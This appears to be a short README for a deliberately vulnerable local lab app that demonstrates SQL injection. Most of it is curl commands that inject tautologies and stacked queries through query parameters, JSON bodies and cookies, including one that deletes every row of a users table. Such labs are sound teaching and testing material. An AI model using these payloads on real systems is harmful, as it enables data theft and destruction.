# vulnerable

## GET request - Get list of users - filter in query param
```bash
curl http://localhost:8080/vun/sql/example1/api/users?name=michal
curl http://localhost:8080/vun/sql/example1/api/users?name=michal%27%20or%201=1%20--%20-
```

## POST request - Get list of users - filter in body
```bash
curl -X POST http://localhost:8080/vun/sql/example2/api/users -H "Content-Type: application/json" -d "{\"filter\": \"michal\"}"  
curl -X POST http://localhost:8080/vun/sql/example2/api/users -H "Content-Type: application/json" -d "{\"filter\": \"michal' or 1=1 -- -\"}"  
```

## Post request - Create new User
```bash
curl -X POST http://localhost:8080/vun/sql/example3/api/users -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker\"}"  
curl -X POST http://localhost:8080/vun/sql/example3/api/users -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker'); SELECT * FROM users; -- - \"}"  
curl -X POST http://localhost:8080/vun/sql/example3/api/users -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker'); DELETE FROM users; -- - \"}"  
```

## GET request - Get list of users - filter in cookie
```bash
curl http://localhost:8080/vun/sql/example4/api/users --cookie "name=michal"
curl http://localhost:8080/vun/sql/example4/api/users --cookie "name=michal'%20or%201=1%20--%20-"
```